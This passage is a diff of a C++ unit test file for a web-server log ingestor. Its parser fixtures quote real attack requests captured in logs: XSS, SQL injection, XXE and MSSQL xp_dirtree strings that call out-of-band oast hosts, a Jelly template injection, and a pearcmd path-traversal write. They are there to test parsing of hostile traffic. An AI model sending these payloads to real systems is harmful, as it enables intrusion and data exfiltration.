+							R"(destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError)"},
+					{R"("?extension=menu&view=menu&parent=\"%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa")",
+							R"(extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa)"},
+					{R"("?h=gentoobrowse-2.0.0_beta7&id=\"><script%20>alert(String.fromCharCode(88,83,83))</script>")",
+							R"(h=gentoobrowse-2.0.0_beta7&id="><script%20>alert(String.fromCharCode(88,83,83))</script>)"},
+					{R"("?h=\"><script%20>alert(String.fromCharCode(88,83,83))</script>&id=d3465d0d00edd302c9d6fc7672a9405921a6a7db")",
+							R"(h="><script%20>alert(String.fromCharCode(88,83,83))</script>&id=d3465d0d00edd302c9d6fc7672a9405921a6a7db)"},
+					{R"("?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq\"><script>alert(document.domain)</script>")",
+							R"(pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(document.domain)</script>)"},
+					{R"("?p=1&xsg-provider=data://text/html,<?php%20echo%20md5(\"CVE-2022-0346\");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp")",
+							R"(p=1&xsg-provider=data://text/html,<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp)"},
+					{R"("?action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=\"")",
+							R"(action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=")"},
+					{R"("?xml=<%3fxml+version%3d\"1.0\"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+\"http%3a//d68kbl4h7ttk5ft3kh10e3yhnbxkdoni3.oast.live/xxe.xml\">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123")",
+							R"(xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//d68kbl4h7ttk5ft3kh10e3yhnbxkdoni3.oast.live/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123)"},
+					{R"("?jvar_page_title=<style><j:jelly%20xmlns:j=\"jelly\"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>")",
+							R"(jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>)"},
+					{R"("?h=gentoobrowse-api-0.11.2.1&id=\"><script%20>alert(String.fromCharCode(88,83,83))</script>")",
+							R"(h=gentoobrowse-api-0.11.2.1&id="><script%20>alert(String.fromCharCode(88,83,83))</script>)"},
+					{R"("?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts=\"%27;%0Aalert(document.domain);//%0a%27")",
+							R"(opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27)"},
+					{R"("?wpapp_shortcode=\"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&wpappninja_simul4=1")",
+							R"(wpapp_shortcode="%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&wpappninja_simul4=1)"},
+					{R"("?post_type=sc_order&order_type=orders&format_err=1\"></script><script>alert(document.domain)</script><script>")",
+							R"(post_type=sc_order&order_type=orders&format_err=1"></script><script>alert(document.domain)</script><script>)"},
+					{R"("?page=ph-settings&ph_message=\"><script>alert(document.domain)</script>")",
+							R"(page=ph-settings&ph_message="><script>alert(document.domain)</script>)"},
+					{R"("?entryPoint=responseEntryPoint&event=1&delegate=a<\"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept")",
+							R"(entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept)"},
+			}),
+			input, expected)
+	{
+		WebStat::QueryString result;
+		auto strm {input};
+		BOOST_REQUIRE_NO_THROW(strm >> result);
+		BOOST_CHECK_EQUAL(result, expected);
+	}
 
-BOOST_AUTO_TEST_CASE(RecordUnparsable)
-{
-	queuedLines.emplace_back("does not parse");
-	auto job = beginIngestQueuedLogLines();
-	BOOST_CHECK_EQUAL(&job.first, &*storeQueueLines.currentRun);
-	BOOST_CHECK(job.second);
-	finishAllJobs();
-	auto dbconn = dbpool->get();
-	auto select = dbconn->select(
-			R"(SELECT id::bigint, value, detail ? 'timestamp' has_ts, (detail->>'hostnameId')::int hostnameId
-			FROM entities
-			WHERE type = 'unparsable_line')");
-	constexpr std::array<std::tuple<EntityId, std::string_view, bool, uint32_t>, 1> EXPECTED {{
-			{rollingEntityCounterBase, "does not parse", true, 1},
-	}};
-	auto rows = select->as<EntityId, std::string_view, bool, uint32_t>();
-	BOOST_CHECK_EQUAL_COLLECTIONS(rows.begin(), rows.end(), EXPECTED.begin(), EXPECTED.end());
-	BOOST_CHECK_EQUAL(stats.linesParsed, 0);
-	BOOST_CHECK_EQUAL(stats.linesParseFailed, 1);
-	BOOST_CHECK_EQUAL(stats.entitiesInserted, 0);
-	BOOST_CHECK(existingEntities->empty()); // Don't clutter existing entities with junk logs
-}
+	BOOST_DATA_TEST_CASE(QueryStringsBad,
+			boost::unit_test::data::make<std::string_view>({
+					R"()",
+					R"("-")",
+					R"(".")",
+					R"(-)",
+					R"(word)",
+					R"(/url/path)",
+			}),
+			input)
+	{
+		WebStat::QueryString result;
+		auto strm {input};
+		BOOST_REQUIRE_THROW(strm >> result, std::invalid_argument);
+	}
 
-BOOST_AUTO_TEST_CASE(RecordUninsertable)
-{
-	auto dbconn = dbpool->get();
-	{ // Part 1: bad HTTP verb causes insert failure after storing entities
-		constexpr std::string_view LOGLINE_UNINSERTABLE
-				= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768319 CAUSEINSERTFAIL "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "text/plain")LOG";
-		queuedLines.emplace_back(LOGLINE_UNINSERTABLE);
+	BOOST_TEST_DECORATOR(*boost::unit_test::timeout(1))
+
+	BOOST_DATA_TEST_CASE(CLFStringsGood,
+			boost::unit_test::data::make<WebStat::ParseData<WebStat::CLFString>>({
+					{R"("")", ""},
+					{R"("-")", std::nullopt},
+					{R"("?")", "?"},
+					{R"(".")", "."},
+					{R"("something")", "something"},
+					{R"("https://google.com")", "https://google.com"},
+					{R"("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")",
+							R"(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36)"},
+			}),
+			input, expected)
+	{
+		WebStat::CLFString result;
+		auto strm {input};
+		BOOST_REQUIRE_NO_THROW(strm >> result);
+		BOOST_CHECK_EQUAL(result, expected);
+	}
+
+	BOOST_DATA_TEST_CASE(CLFStringsBad,
+			boost::unit_test::data::make<std::string_view>({
+					R"()",
+					R"(-)",
+					R"(word)",
+					R"(/url/path)",
+			}),
+			input)
+	{
+		WebStat::QueryString result;
+		auto strm {input};
+		BOOST_REQUIRE_THROW(strm >> result, std::invalid_argument);
+	}
+
+	constexpr std::string_view LOGLINE1
+			= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768318 GET "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "test/plain")LOG";
+	constexpr std::string_view LOGLINE2
+			= R"LOG(www.randomdan.homeip.net 43.128.84.166 1755561575973204 GET "/app-dicts/myspell-et/Manifest" "" HTTP/1.1 200 312 10369 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "image/png")LOG";
+	constexpr std::string_view LOGLINE_DUPES
+			= R"LOG(www.randomdan.homeip.net 43.128.84.166 1755561575973204 GET "/app-dicts/myspell-et/Manifest" "" HTTP/1.1 200 312 10369 "www.randomdan.homeip.net" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36" "image/png")LOG";
+
+	BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("QuotedStringsGood"))
+	BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("QueryStringsGood"))
+	BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("CLFStringsGood"))
+
+	BOOST_DATA_TEST_CASE(ExtractFields,
+			boost::unit_test::data::make<WebStat::ParseData<WebStat::Ingestor::ScanValues>>({
+					{LOGLINE1,
+							{"git.randomdan.homeip.net", "98.82.40.168", 1755561576768318, "GET",
+									R"(/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest)",
+									R"(h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714)",
+									"HTTP/1.1", 200, 1884, 107791, std::nullopt,
+									R"(Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36)",
+									"test/plain"}},
+					{LOGLINE2,
+							{"www.randomdan.homeip.net", "43.128.84.166", 1755561575973204, "GET",
+									"/app-dicts/myspell-et/Manifest", std::nullopt, "HTTP/1.1", 200, 312, 10369,
+									"https://google.com",
+									R"(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36)",
+									"image/png"}},
+			}),
+			input, expected)
+	{
+		const auto result = WebStat::Ingestor::scanLogLine(input);
+		BOOST_REQUIRE(result);
+		BOOST_CHECK_EQUAL(*result, expected);
+	}
+
+	BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3580673700)
+	{
+		const auto result = WebStat::Ingestor::scanLogLine(
+				R"LOG(gentoobrowse.randomdan.homeip.net 5.183.129.58 1759960912510520 GET "/packages/dev-php/pecl-uploadprogress(),')\"((,," "" HTTP/1.1 404 0 10051 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" "-")LOG");
+		BOOST_REQUIRE(result);
+		BOOST_CHECK_EQUAL(std::get<4>(*result), R"LOG(/packages/dev-php/pecl-uploadprogress(),')"((,,)LOG");
+	}
+
+	BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3603068405)
+	{
+		const auto result = WebStat::Ingestor::scanLogLine(
+				R"LOG(gentoobrowse.randomdan.homeip.net 5.183.129.58 1759960912705682 GET "/packages/dev-php/pecl-uploadprogress'yqFSRA<'\">yuezhx" "" HTTP/1.1 404 0 19143 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" "-")LOG");
+		BOOST_REQUIRE(result);
+		BOOST_CHECK_EQUAL(std::get<4>(*result), R"LOG(/packages/dev-php/pecl-uploadprogress'yqFSRA<'">yuezhx)LOG");
+	}
+
+	BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3482917779)
+	{
+		const auto result = WebStat::Ingestor::scanLogLine(
+				R"LOG(195.166.151.214 62.171.174.195 1774536220216585 GET "/index.php" "?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php" HTTP/1.1 404 376 5811 "-" "libredtail-http" "text/html")LOG");
+		BOOST_REQUIRE(result);
+		const auto queryString = std::get<5>(*result);
+		BOOST_REQUIRE(queryString);
+		BOOST_CHECK_EQUAL(queryString.value(),
+				R"LOG(lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php)LOG");
+	}
+
+	BOOST_AUTO_TEST_CASE(ExtractFieldsEdgeCasesUnparsable3354288) // Long duration
+	{
+		const auto result = WebStat::Ingestor::scanLogLine(
+				R"LOG(git.randomdan.homeip.net 216.73.216.212 1770062062011035 GET "/repo/netfs/patch/libfusepp" "?id=46f6aa3507120f4b69a54abc02d8829eac005b6f" HTTP/2.0 200 1 7361204168 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)" "text/plain")LOG");
+		BOOST_REQUIRE(result);
+		const auto duration = std::get<9>(*result);
+		BOOST_CHECK_EQUAL(7361204168, duration);
+	}
+
+	class TestIngestor : public WebStat::BasicTestIngestor {
+	public:
+		TestIngestor() : WebStat::BasicTestIngestor {"test-hostname"} { }
+
+	protected:
+		[[gnu::format(printf, 3, 4)]] void
+		// NOLINTNEXTLINE(modernize-avoid-variadic-functions)
+		log(int, const char * msgfmt, ...) const override
 		{
-			// This run fails
-			auto job = beginIngestQueuedLogLines();
-			BOOST_CHECK_EQUAL(&job.first, &*storeQueueLines.currentRun);
-			BOOST_CHECK(job.second);
-			finishAllJobs();
-			BOOST_REQUIRE_EQUAL(stats.batchesStarted, 1);
-			BOOST_REQUIRE_EQUAL(stats.batchesCompleted, 0);
-			BOOST_REQUIRE(previousIngestErrored);
+			va_list args;
+			va_start(args, msgfmt);
+			std::unique_ptr<char, decltype(&free)> msg {nullptr, nullptr};
+			BOOST_REQUIRE_GE(vasprintf(std::out_ptr(msg, &free), msgfmt, args), 0);
+			va_end(args);
+			BOOST_REQUIRE(msg);
+			BOOST_TEST_MESSAGE(msg.get());
+			++logsWritten;
 		}
-		{
-			// Try it again...
-			auto job = beginIngestQueuedLogLines();
-			BOOST_CHECK_EQUAL(&job.first, &*storeQueueLines.currentRun);
-			BOOST_CHECK(job.second);
-			finishAllJobs();
-			BOOST_REQUIRE_EQUAL(stats.batchesStarted, 2);
-			BOOST_REQUIRE_EQUAL(stats.batchesCompleted, 1);
-			BOOST_REQUIRE(!previousIngestErrored);
-		}
-		auto select = dbconn->select(
-				R"(SELECT id::bigint, value, detail ? 'timestamp' has_ts, (detail->>'hostnameId')::int hostnameId, (detail->>'error')::text
-			FROM entities
-			WHERE type = 'uninsertable_line')");
-		constexpr std::array<std::tuple<EntityId, std::string_view, bool, uint32_t, std::string_view>, 1> EXPECTED {{
-				{rollingEntityCounterBase + 5, LOGLINE_UNINSERTABLE, true, 1,
-						"ERROR:  invalid input value for enum http_verb: \"CAUSEINSERTFAIL\"\n"
-						"CONTEXT:  unnamed portal parameter $5 = '...'\n"},
-		}};
-		auto rows = select->as<EntityId, std::string_view, bool, uint32_t, std::string_view>();
-		BOOST_CHECK_EQUAL_COLLECTIONS(rows.begin(), rows.end(), EXPECTED.begin(), EXPECTED.end());
-		BOOST_CHECK_EQUAL(stats.linesParsed, 2);
-		BOOST_CHECK_EQUAL(stats.logsInserted, 0);
+	};
+
+	constexpr std::array<std::string_view, 9> ENTITY_TYPE_VALUES {
+			{
+					{"host"},
+					{"virtual_host"},
+					{"path"},
+					{"query_string"},
+					{"referrer"},
+					{"user_agent"},
+					{"unparsable_line"},
+					{"uninsertable_line"},
+					{"content_type"},
+			},
+	};
+
+	BOOST_FIXTURE_TEST_SUITE(I, TestIngestor);
+	BOOST_TEST_DECORATOR(*boost::unit_test::depends_on("ExtractFields"))
+
+	using StoreLogLineData = std::tuple<std::string_view, size_t>;
+
+	BOOST_DATA_TEST_CASE(StoreLogLine,
+			boost::unit_test::data::make<StoreLogLineData>({
+					{LOGLINE1, 5},
+					{LOGLINE2, 7},
+			}),
+			lineIn, entities)
+	{
+		const std::string line {lineIn};
+		ingestLogLines(DB::MockDatabase::openConnectionTo("webstat").get(), {&line, 1});
+		BOOST_CHECK_EQUAL(stats.linesRead, 0);
+		BOOST_CHECK_EQUAL(stats.linesParsed, 1);
 		BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
-		BOOST_CHECK_EQUAL(stats.entitiesInserted, 10); // 5 were inserted, twice, but the savepoint was rolled back
-		BOOST_CHECK(existingEntities->empty()); // ... so existing entities should be empty
-	}
-
-	{ // Part 2: corrected HTTP verb allows insert, requires that the entities are re-stored
-		constexpr std::string_view LOGLINE_UNINSERTABLE_GET
-				= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768320 GET "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "text/plain")LOG";
-		queuedLines.emplace_back(LOGLINE_UNINSERTABLE_GET);
-		{
-			auto job = beginIngestQueuedLogLines();
-			BOOST_CHECK_EQUAL(&job.first, &*storeQueueLines.currentRun);
-			BOOST_CHECK(job.second);
-			finishAllJobs();
-		}
-		BOOST_CHECK_EQUAL(stats.linesParsed, 3);
 		BOOST_CHECK_EQUAL(stats.logsInserted, 1);
-		BOOST_CHECK_EQUAL(stats.entitiesInserted, 15);
+		BOOST_CHECK_EQUAL(stats.entitiesInserted, entities);
 		BOOST_CHECK_EQUAL(existingEntities->size(), 5);
 	}
-}
 
-BOOST_AUTO_TEST_CASE(PurgeOldJob)
-{
-	BOOST_CHECK_EQUAL(3, jobPurgeOldLogs()());
-}
-
-BOOST_AUTO_TEST_CASE(RetryUninsertableNone, *boost::unit_test::timeout(1))
-{
-	BOOST_CHECK_EQUAL(0, jobRetryUninsertableLines()());
-}
-
-BOOST_AUTO_TEST_CASE(RetryUninsertableSuccess, *boost::unit_test::timeout(1))
-{
-	auto dbconn = dbpool->get();
-	const auto uninsertableLineId = storeUninsertableLine(
-			dbconn.get(), getHostnameId(dbconn.get()), LOGLINE1, std::runtime_error {"some error"});
-	BOOST_REQUIRE(getEntityById(dbconn.get(), uninsertableLineId));
-
-	BOOST_CHECK_EQUAL(1, jobRetryUninsertableLines()());
-	BOOST_REQUIRE(!getEntityById(dbconn.get(), uninsertableLineId));
-}
-
-BOOST_AUTO_TEST_CASE(RetryUninsertableNowUnparsable, *boost::unit_test::timeout(1))
-{
-	auto dbconn = dbpool->get();
-	const auto uninsertableId = storeUninsertableLine(
-			dbconn.get(), getHostnameId(dbconn.get()), "blah", std::runtime_error {"some error"});
-	BOOST_REQUIRE(uninsertableId);
-
-	BOOST_CHECK_EQUAL(0, jobRetryUninsertableLines()());
-	auto updatedEntity = getEntityById(dbconn.get(), uninsertableId);
-	BOOST_REQUIRE(updatedEntity);
-	BOOST_CHECK_EQUAL(std::get<1>(*updatedEntity), EntityType::UnparsableLine);
-}
-
-BOOST_AUTO_TEST_CASE(RetryUninsertableStillUninsertable, *boost::unit_test::timeout(1))
-{
-	auto dbconn = dbpool->get();
-	constexpr std::string_view LOGLINE_UNINSERTABLE
-			= R"LOG(git.randomdan.homeip.net 98.82.40.168 1755561576768318 CAUSEINSERTFAIL "/repo/gentoobrowse-api/commit/gentoobrowse-api/unittests/fixtures/756569aa764177340726dd3d40b41d89b11b20c7/app-crypt/pdfcrack/Manifest" "?h=gentoobrowse-api-0.9.1&id=a2ed3fd30333721accd4b697bfcb6cc4165c7714" HTTP/1.1 200 1884 107791 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36" "text/plain")LOG";
-	const auto uninsertableId = storeUninsertableLine(
-			dbconn.get(), getHostnameId(dbconn.get()), LOGLINE_UNINSERTABLE, std::runtime_error {"some error"});
-	BOOST_REQUIRE(uninsertableId);
-
-	BOOST_CHECK_EQUAL(0, jobRetryUninsertableLines()());
-	const auto updatedEntity = getEntityById(dbconn.get(), uninsertableId);
-	BOOST_REQUIRE(updatedEntity);
-	BOOST_CHECK_EQUAL(std::get<1>(*updatedEntity), EntityType::UninsertableLine);
-	const auto & detail = std::get<3>(*updatedEntity);
-	BOOST_REQUIRE(detail);
-
-	BOOST_TEST_CONTEXT(*detail) {
-		BOOST_CHECK(detail->starts_with("{"));
-		BOOST_CHECK(detail->contains("invalid input value for enum http_verb"));
-		BOOST_CHECK(detail->contains("retriedAt"));
-		BOOST_CHECK(detail->ends_with("}"));
+	BOOST_AUTO_TEST_CASE(StoreLogLinesWithDuplicateOfDifferentType, *boost::unit_test::depends_on("I/StoreLogLine"))
+	{
+		const std::vector lines {std::string {LOGLINE1}, std::string {LOGLINE2}, std::string {LOGLINE_DUPES}};
+		ingestLogLines(DB::MockDatabase::openConnectionTo("webstat").get(), lines);
+		BOOST_CHECK_EQUAL(stats.linesRead, 0);
+		BOOST_CHECK_EQUAL(stats.linesParsed, 3);
+		BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
+		BOOST_CHECK_EQUAL(stats.logsInserted, 3);
+		BOOST_CHECK_EQUAL(stats.entitiesInserted, 13);
+		BOOST_CHECK_EQUAL(existingEntities->size(), 11);
 	}
-}
 
-BOOST_AUTO_TEST_CASE(LogStatsSignal)
-{
-	BOOST_REQUIRE_EQUAL(logsWritten, 0);
-	raise(SIGUSR1);
-	BOOST_CHECK_EQUAL(logsWritten, 1);
-}
-
-BOOST_AUTO_TEST_CASE(LogResetSignal)
-{
-	stats = {1, 2, 3, 4, 5, 6, 7, 8};
-	raise(SIGUSR2);
-	BOOST_CHECK_EQUAL(stats, Stats {});
-}
-
-using CreateEntitiesData = std::tuple<std::string_view, WebStat::EntityType, int>;
-
-constexpr int entityOffsetHost1 = 14, entityOffsetHost2 = entityOffsetHost1 + 1,
-			  entityOffsetHost3 = entityOffsetHost2 + 1, entityOffsetVHost1 = entityOffsetHost3 + 1,
-			  entityOffsetVHost2 = entityOffsetVHost1 + 1, entityOffsetVHost3 = entityOffsetVHost2 + 1;
-
-BOOST_DATA_TEST_CASE(CreateEntities,
-		boost::unit_test::data::make<CreateEntitiesData>({
-				{"host1", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost1},
-				{"host2", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost2},
-				{"host3", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost3},
-				{"host1", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost1},
-				{"host2", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost2},
-				{"host3", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost3},
-				{"host1", WebStat::EntityType::VirtualHost, rollingEntityCounterBase + entityOffsetVHost1},
-				{"host2", WebStat::EntityType::VirtualHost, rollingEntityCounterBase + entityOffsetVHost2},
-				{"host3", WebStat::EntityType::VirtualHost, rollingEntityCounterBase + entityOffsetVHost3},
-				{"host1", WebStat::EntityType::VirtualHost, rollingEntityCounterBase + entityOffsetVHost1},
-				{"host2", WebStat::EntityType::VirtualHost, rollingEntityCounterBase + entityOffsetVHost2},
-				{"host3", WebStat::EntityType::VirtualHost, rollingEntityCounterBase + entityOffsetVHost3},
-				{"host2", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost2},
-				{"host1", WebStat::EntityType::VirtualHost, rollingEntityCounterBase + entityOffsetVHost1},
-				{"host3", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost3},
-				{"host1", WebStat::EntityType::Host, rollingEntityCounterBase + entityOffsetHost1},
-		}),
-		value, type, expectedId)
-{
-	auto dbc = dbpool->get();
-	auto entityInsert = dbc->select(WebStat::SQL::ENTITY_INSERT, WebStat::SQL::ENTITY_INSERT_OPTS);
-	entityInsert->bindParamS(0, value);
-	entityInsert->bindParamS(1, ENTITY_TYPE_VALUES[std::to_underlying(type)]);
-	BOOST_REQUIRE_NO_THROW(entityInsert->execute());
-	size_t rows = 0;
-	for (auto [entityId, detailIsNull] : entityInsert->as<int, bool>()) {
-		++rows;
-		BOOST_REQUIRE_EQUAL(rows, 1);
-		BOOST_CHECK_EQUAL(entityId, expectedId);
-		BOOST_CHECK_EQUAL(detailIsNull, true);
+	BOOST_AUTO_TEST_CASE(StoreLog, *boost::unit_test::depends_on("I/StoreLogLine"))
+	{
+		const WebStat::LogFile log {"/tmp/store-log-fixture.log", 10};
+		std::ifstream input {log.path};
+		BOOST_REQUIRE(input.good());
+		BOOST_CHECK_NO_THROW(ingestLog(input));
+		BOOST_CHECK_EQUAL(stats.linesRead, 10);
+		BOOST_CHECK_LE(stats.linesParsed, 10);
+		BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
+		BOOST_CHECK_GT(stats.linesParked, 0);
+		BOOST_CHECK_GE(stats.entitiesInserted, 1);
+		BOOST_CHECK_EQUAL(stats.linesParked + stats.logsInserted, 10);
+		BOOST_CHECK_EQUAL(stats.entitiesInserted, existingEntities->size());
 	}
-}
 
-BOOST_AUTO_TEST_CASE(TerminateMidIngest, *boost::unit_test::timeout(5))
-{
-	settings.maxBatchSize = 64;
-	queuedLines.append_range(std::views::repeat(std::string {LOGLINE1}, 1000));
-	beginIngestQueuedLogLines();
-	std::this_thread::sleep_for(std::chrono::milliseconds {100});
-	raise(SIGTERM);
-	finishAllJobs();
-	BOOST_CHECK_EQUAL(stats.linesRead, 0); // We appended directly
-	// Some progress was made
-	BOOST_CHECK_GT(stats.linesParsed, 0);
-	BOOST_CHECK_GT(stats.logsInserted, 0);
-	BOOST_TEST_INFO(processingLines.size());
-	BOOST_CHECK_EQUAL(processingLines.size(), 1000 - (settings.maxBatchSize * stats.batchesCompleted));
-	// Progress was interrupted
-	BOOST_CHECK_GE(stats.logsInserted, (settings.maxBatchSize * stats.batchesCompleted));
-	BOOST_CHECK_LT(stats.logsInserted, settings.maxBatchSize * (stats.batchesCompleted + 1));
-	BOOST_CHECK_GT(processingLines.size(), 0);
-
-	BOOST_CHECK(queuedLines.empty());
-}
-
-BOOST_AUTO_TEST_SUITE_END();
-
-BOOST_AUTO_TEST_CASE(FetchRealUserAgentDetail, *boost::unit_test::disabled())
-{
-	const auto uaDetailReq = WebStat::curlGetUserAgentDetail(0,
-			R"(Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36)",
-			"http://useragentstring.com");
-	BOOST_REQUIRE(uaDetailReq);
-	BOOST_REQUIRE_EQUAL(CURLE_OK, curl_easy_perform(uaDetailReq->hnd.get()));
-
-	BOOST_TEST_CONTEXT(uaDetailReq->result) {
-		BOOST_CHECK(uaDetailReq->result.starts_with("{"));
-		BOOST_CHECK(uaDetailReq->result.ends_with("}"));
-		BOOST_CHECK(uaDetailReq->result.contains(R"("agent_type":)"));
-		BOOST_CHECK(uaDetailReq->result.contains(R"("os_type":)"));
+	BOOST_AUTO_TEST_CASE(TerminateHandler, *boost::unit_test::timeout(5))
+	{
+		std::ifstream input {"/dev/null"};
+		BOOST_REQUIRE(input.good());
+		BOOST_REQUIRE(!terminated);
+		raise(SIGTERM);
+		BOOST_REQUIRE(terminated);
+		ingestLog(input);
+		BOOST_CHECK_EQUAL(stats.linesRead, 0);
+		BOOST_CHECK_EQUAL(stats.linesParsed, 0);
+		BOOST_CHECK_EQUAL(stats.linesParseFailed, 0);
 	}
-}
 
-using DecomposeUriData = std::tuple<std::string_view, std::string_view, std::string_view, std::string_view,
-		std::optional<std::string_view>, std::string_view>;
+	BOOST_AUTO_TEST_CASE(ParkLogLine)
+	{
+		queuedLines.emplace_back(LOGLINE1);
+		queuedLines.emplace_back(LOGLINE2);
+		const auto path = parkLogLines(queuedLines);
+		BOOST_REQUIRE(path);
+		BOOST_TEST_INFO(*path);
+		BOOST_REQUIRE(std::filesystem::exists(*path));
+		BOOST_CHECK_EQUAL(std::filesystem::file_size(*path), LOGLINE1.length() + LOGLINE2.length() + 4);
+		BOOST_CHECK_EQUAL(stats.linesParked, 2);
+	}
 
-BOOST_DATA_TEST_CASE(DecomposeReferrerUriBad,
-		boost::unit_test::data::make<std::string_view>({
-				"",
-				"not a uri",
-				"www.google.com",
-				"www.google.com/",
-				"www.google.com/path",
-				R"(http://portage.randomdan.homeip.net/');declare @q varchar(99);set @q='\\mh7bick2533bv3lybfcok0vwangg48szlnga7yw.oasti'+'fy.com\tqa'; exec master.dbo.xp_dirtree @q;--)",
